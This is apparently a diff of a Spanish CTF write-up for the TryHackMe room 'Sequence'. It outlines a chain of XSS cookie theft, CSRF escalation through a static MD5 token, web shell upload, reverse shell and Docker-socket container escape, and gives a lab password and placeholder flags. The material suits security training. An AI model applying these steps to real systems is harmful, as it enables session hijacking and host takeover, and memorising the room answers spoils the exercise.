@@ -1,18 +1,23 @@
-# Sequence [MEDIUM]
+# Sequence
 
-### Información de la Sala / Room Information
-
-* **Dificultad / Difficulty:** MEDIUM.
-* **Tipo / Type:** Premium (requiere suscripción).
-* **Slug:** `sequence`
-* **Link:** https://tryhackme.com/room/sequence
-* **Fuente / Source:** [Jery0843/TryHackMe](https://github.com/Jery0843/TryHackMe)
+| **Dificultad** | Medium |
+| **Tipo** | CTF |
+| **Slug** | `sequence` |
+| **Link** | [TryHackMe](https://tryhackme.com/room/sequence) |
+| **Sección** | 02 Level Medium |
+| **Fuente** | texto oficial THM + anotaciones propias |
+| **Componentes** | XSS / session hijacking / CSRF / static tokens / file upload / web shell / Docker escape |
+| **Impacto** | Encadenar XSS, CSRF y un Docker socket montado para escalar de visitante a root y escapar el contenedor |
 
 ---
 
-## Solucionario de Tareas / Task Solutions
+**Contexto:** CTF de dificultad media (Premium) con una cadena de vulnerabilidades web: XSS para robar la sesión del moderator, tokens CSRF estáticos para escalar a admin, acceso a un panel de finanzas, upload de web shell y escape de contenedor vía Docker socket.
 
-### Setup & Reconocimiento Inicial
+## Solucionario
+
+### Task 1: Setup & Reconocimiento Inicial
+
+**Explicación:**
 
 ```bash
 echo "10.10.195.11 review.thm" | sudo tee -a /etc/hosts
@@ -44,7 +49,13 @@ Lottery panel: /lottery.php
 Password: S60u}f5j
 ```
 
-### Fase 1 - XSS a Moderator
+| # | Pregunta | Respuesta |
+|---|----------|-----------|
+| 1 | (Reconocimiento / Deploy y setup) | `No answer needed` |
+
+### Task 2: Fase 1 - XSS a Moderator
+
+**Explicación:**
 
 **1. Crear y alojar payload XSS** (`test.js`):
 ```bash
@@ -71,7 +82,13 @@ Reemplazar tu cookie `PHPSESSID` por este valor. La vista de moderator muestra:
 Flag#1: THM{xxxxxxxxxxxxxxxx}
 ```
 
-### Fase 2 - Moderator a Admin vía CSRF
+| # | Pregunta | Respuesta |
+|---|----------|-----------|
+| 1 | (Flag 1 - acceso mod) | `THM{xxxxxxxxxxxxxxxx}` |
+
+### Task 3: Fase 2 - Moderator a Admin vía CSRF
+
+**Explicación:**
 
 **1. Inspeccionar token CSRF** en `/settings.php`:
 ```html
@@ -97,7 +114,13 @@ http://review.thm/promote_coadmin.php?username=mod&csrf_token_promote=21232f297a
 Flag#2: THM{yyyyyyyyyyyyyyyy}
 ```
 
-### Fase 3 - Acceso al Panel de Finanzas
+| # | Pregunta | Respuesta |
+|---|----------|-----------|
+| 1 | (Flag 2 - acceso admin) | `THM{yyyyyyyyyyyyyyyy}` |
+
+### Task 4: Fase 3 - Acceso al Panel de Finanzas
+
+**Explicación:**
 
 En `/dashboard.php`, interceptar la petición POST al pulsar "Lottery" y modificar:
 ```
@@ -109,7 +132,13 @@ Al pedir la contraseña del panel de finanzas, ingresar:
 S60u}f5j
 ```
 
-### Fase 4 - Upload de Archivo y Shell
+| # | Pregunta | Respuesta |
+|---|----------|-----------|
+| 1 | (Acceso al panel de finanzas) | `No answer needed` |
+
+### Task 5: Fase 4 - Upload de Archivo y Shell
+
+**Explicación:**
 
 **1. Crear y subir web shell** vía el panel de finanzas:
 ```bash
@@ -128,7 +157,13 @@ El output confirma ejecución como **root** dentro del contenedor Docker:
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-### Fase 5 - Escape de Contenedor y Flag de Root
+| # | Pregunta | Respuesta |
+|---|----------|-----------|
+| 1 | (Web shell / ejecución de comandos) | `No answer needed` |
+
+### Task 6: Fase 5 - Escape de Contenedor y Flag de Root
+
+**Explicación:**
 
 **1. Lanzar reverse shell:**
 ```bash
@@ -169,7 +204,13 @@ cat /mnt/root/flag.txt
 Flag#3: THM{zzzzzzzzzzzzzzzzzz}
 ```
 
+| # | Pregunta | Respuesta |
+|---|----------|-----------|
+| 1 | (Flag 3 - acceso root) | `THM{zzzzzzzzzzzzzzzzzz}` |
+
 ### Recapitulación de Flags
+
+**Explicación:**
 
 - **Flag 1 (acceso mod):** `THM{xxxxxxxxxxxxxxxx}`
 - **Flag 2 (acceso admin):** `THM{yyyyyyyyyyyyyyyy}`
@@ -177,13 +218,29 @@ Flag#3: THM{zzzzzzzzzzzzzzzzzz}
 
 La cadena: **XSS** → secuestro de sesión, abuso de **tokens CSRF estáticos** → escalada de privilegios, **upload inseguro de archivos** → ejecución de código, y **Docker socket montado** → escape de contenedor.
 
+| # | Pregunta | Respuesta |
+|---|----------|-----------|
+| 1 | (Flag 1) | `THM{xxxxxxxxxxxxxxxx}` |
+| 2 | (Flag 2) | `THM{yyyyyyyyyyyyyyyy}` |
+| 3 | (Flag 3) | `THM{zzzzzzzzzzzzzzzzzz}` |
+
 ---
 
-## ⚠️ Descargo de Responsabilidad (Disclaimer)
+**Metodología:**
 
-Este contenido se presenta exclusivamente con fines académicos y educativos.
+1. Setup de hosts y servicio HTTP local para alojar el payload, y nmap de reconocimiento.
+2. Fuzzing de endpoints con ffuf para descubrir `/mail/`, `/login.php`, `/contact.php`.
+3. Leer `dump.txt` para obtener rutas de los paneles y la contraseña `S60u}f5j`.
+4. XSS con `test.js` para robar la cookie del moderator y suplantar la sesión.
+5. Abusar del token CSRF estático (MD5 de `mod`/`admin`) para escalar a admin.
+6. Interceptar el POST para cambiar `feature=lottery.php` a `finance.php`.
+7. Subir una web shell y obtener reverse shell.
+8. Escapar el contenedor montando el filesystem del host vía Docker socket y leer la flag de root.
 
-**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
-**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
-**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
-**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
+**Learning chain:** XSS -> session hijack -> static CSRF tokens -> privilege escalation -> insecure upload -> RCE -> Docker socket -> container escape
+
+**Lección:** *Los tokens CSRF estáticos (predecibles como MD5 de strings) anulan la protección CSRF, y un Docker socket montado dentro de un contenedor equivale a root inmediato en el host.*
+
+**MITRE ATT&CK:** T1059 (Command and Scripting Interpreter) · T1071 (Application Layer Protocol) · T1610 (Deploy Container)* · T1505.003 (Web Shell) · CWE-79 (XSS) · CWE-352 (CSRF) · CWE-434 (Unrestricted Upload)
+
+**Fuente:** [TryHackMe - Sequence](https://tryhackme.com/room/sequence)
